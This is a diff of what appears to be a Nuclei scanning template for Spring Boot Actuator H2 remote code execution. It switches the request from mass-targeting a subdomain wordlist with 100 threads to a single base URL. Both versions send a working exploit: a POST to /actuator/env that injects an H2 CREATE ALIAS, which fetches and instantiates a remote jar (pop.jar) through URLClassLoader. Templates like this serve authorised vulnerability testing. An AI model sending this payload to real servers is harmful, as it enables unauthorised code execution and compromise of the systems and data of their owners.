@@ -15,22 +15,16 @@ info:
     - https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
-      - |
-        POST /actuator/env HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
-        Content-Type: application/json
-
-        {
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/env"
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
         "name": "spring.datasource.hikari.connection-init-sql",
         "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
-        }
+      }
     matchers-condition: and
     matchers:
       - type: status
